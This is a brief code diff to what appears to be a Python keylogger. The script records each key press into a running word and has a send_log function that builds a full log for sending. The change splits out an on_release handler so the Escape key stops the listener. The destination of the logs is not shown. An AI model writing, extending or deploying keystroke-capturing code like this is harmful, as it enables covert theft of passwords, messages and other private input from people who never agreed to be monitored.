@@ -50,6 +50,8 @@ def on_press(key):
         char = f"{key}"
         char = char[1:-1]
         word += char
+
+def on_release(key):
     if key == Key.esc:
         return False
 
@@ -60,5 +62,5 @@ def send_log():
         full_log
     )
 
-with Listener(on_press=on_press) as listener:
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
